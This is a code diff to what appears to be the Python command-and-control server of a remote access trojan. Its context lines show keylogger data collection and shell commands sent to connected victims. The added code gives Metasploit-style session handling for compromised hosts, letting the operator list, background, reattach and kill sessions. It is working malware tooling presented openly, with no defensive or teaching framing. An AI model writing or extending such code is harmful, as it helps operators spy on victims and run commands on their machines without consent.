@@ -15,6 +15,8 @@ streaming = False
 keylogger_data = []  # List to store keylogger data
 keylogger_running = False  # Flag to check if keylogger is running
 
+sessions = {}  # Dictionary to store active sessions
+
 html_template = """
 <!doctype html>
 <html lang="en">
@@ -129,6 +131,7 @@ def dump_keylogger_data():
 def handle_client(client_socket, addr):
     target_ip, target_port = addr
     client_id = f"{target_ip}:{target_port}"
+    sessions[client_id] = client_socket
     print(Fore.GREEN + f"[ * ] Session started for {client_id}")
 
     while True:
@@ -235,6 +238,43 @@ def handle_client(client_socket, addr):
                 client_socket.send(shell_command.encode('utf-8'))
                 response = client_socket.recv(4096).decode('utf-8', errors='ignore')
                 print(Fore.WHITE + response)
+
+        elif command == "background":
+            print(Fore.GREEN + f"[ * ] Session {client_id} sent to background.")
+            return  # Exit the handle_client function to send the session to the background
+
+        elif command.startswith("sessions -i"):
+            try:
+                session_id = command.split(' ')[2]
+                if session_id in sessions:
+                    handle_client(sessions[session_id], addr)  # Reactivate the session
+                else:
+                    print(Fore.RED + f"[ * ] No session with ID {session_id}.")
+            except IndexError:
+                print(Fore.RED + "[ * ] Usage: sessions -i <session_id>")
+
+        elif command == "sessions -l":
+            print(Fore.GREEN + "[ * ] Active sessions:")
+            for session, sock in sessions.items():
+                print(Fore.WHITE + f"  - {session}")
+
+        elif command.startswith("sessions -k"):
+            try:
+                session_id = command.split(' ')[2]
+                if session_id in sessions:
+                    sessions[session_id].close()  # Close the socket connection
+                    del sessions[session_id]  # Remove the session from the dictionary
+                    print(Fore.GREEN + f"[ * ] Session {session_id} killed.")
+                else:
+                    print(Fore.RED + f"[ * ] No session with ID {session_id}.")
+            except IndexError:
+                print(Fore.RED + "[ * ] Usage: sessions -k <session_id>")
+
+        elif command == "sessions -K":
+            for session_id, sock in list(sessions.items()):
+                sock.close()  # Close the socket connection
+                del sessions[session_id]  # Remove the session from the dictionary
+            print(Fore.GREEN + "[ * ] All sessions killed.")
 
 # Keep your existing `main` function and other logic below
 
